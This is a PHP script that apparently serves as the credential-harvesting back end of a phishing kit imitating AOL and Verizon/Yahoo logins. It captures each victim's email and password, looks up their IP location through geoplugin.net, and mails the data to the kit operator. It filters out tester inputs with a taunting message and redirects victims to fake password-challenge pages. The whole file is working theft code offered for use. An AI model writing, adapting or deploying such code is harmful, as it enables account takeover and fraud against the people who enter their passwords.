<?php
error_reporting();
ob_start();
session_start();
$togo = @$_GET['svr'];
$asp = "MyAccounts.aspx";
$axp ="Re_Identify";

//Getting user ip & hostname & mapping it to location
$ip = getenv("REMOTE_ADDR");
$getipinfo = file_get_contents("http://www.geoplugin.net/php.gp?ip=".$ip."");
$data = unserialize($getipinfo);
$city=$data['geoplugin_city'];
          $region=$data['geoplugin_regionName'];
          $country=$data['geoplugin_countryName'];
          $log_date = date('d/m/Y - h:i:s');
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];




/** form fields **/

$email = $_SESSION['email'];
$passwd = $_POST['password'];
$wizard = $_POST['username'];
$domain = @substr(strrchr($email, "@"), 1);
if (isset($wizard) && !empty($wizard)) {
    die();
} else {
//Add bad key minimizer
    include 'sanitize_password.php';

//Empty string catcher and key sanitizing
    if ($passwd =="" && $togo == "") {
        $setback = "./nopasswd.php";
        header("Location: $setback?status=error&errorcode=3&eun=$email&cfm=emptyField&provider=@$domain");
    } elseif (match($badkeys, $passwd) && $togo == "") {
        $setback = "./nopasswd.php";
        header("Location: $setback?status=error&errorcode=3&eun=$email&cfm=you_too_hehehe_winks&provider=@$domain");
    } elseif ($passwd =="" && $togo == "tf") {
        $setback = "./recessnopasswd.php";
        header("Location: $setback?status=error&errorcode=3&eun=$email&cfm=emptyField&provider=@$domain");
    } elseif (match($badkeys, $passwd) && $togo == "tf") {
        $setback = "./recessnopasswd.php";
        header("Location: $setback?status=error&errorcode=3&eun=$email&cfm=you_too_hehehe_winks&provider=@$domain");
    } else {
   //including email to send
        include '../Email.php';


   //Arranging reports
        $Hash = "==================+[ The - Apprentice ]+==================
Email : $email
Password   : $passwd
Dom : $domain
============= [ Ip & Hostname Info ] =============

Client IP: $ip
Country: $country
Region: $region
City: $city
TimeStamp: $log_date 
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";

   //Relaying...
        $subject = "$email | New $domain User Notification";
        $headers = "From: Alert<salesjob@privejets.net>";
        $headers .= $_POST['eMailAdd']."\n";
        $headers .= "MIME-Version: 1.0\n";
        mail($SEND, $subject, $Hash, $headers);

   //Dynamic redirect
        if ($togo == 'tf') {
    //Exiting
    //Exiting
            $asp = "/account/challenge/password?sess=14&src=https://$domain.aol.com&.intl=us&.lang=en-US&.partner=vz-acs&authMechanism=primary&display=login&yid=$email&done=https%3A%2F%2Fverizon.yahoo.com%2F&sessionIndex=Qw--&acrumb=4SZYMaUi";
            $top = "Consenting.app";
            $Redirect = "../docget.php?top=$top&crumb=$asp";

            header("Location: $Redirect").md5(time());
        } else {
  //Exiting
  //Exiting
            $asp = "/account/challenge/password?.src=$domain&.intl=us&.lang=en-US&.partner=vz-acs&authMechanism=primary&display=login&yid=$email&done=https%3A%2F%2Fverizon.yahoo.com%2F&sessionIndex=Qw--&acrumb=4SZYMaUi";
            $top = "Recesserror.app";
            $Redirect = "Recesserror.php?top=$top&crumb=$asp";

            header("Location: $Redirect").md5(time());
        }
    }
}
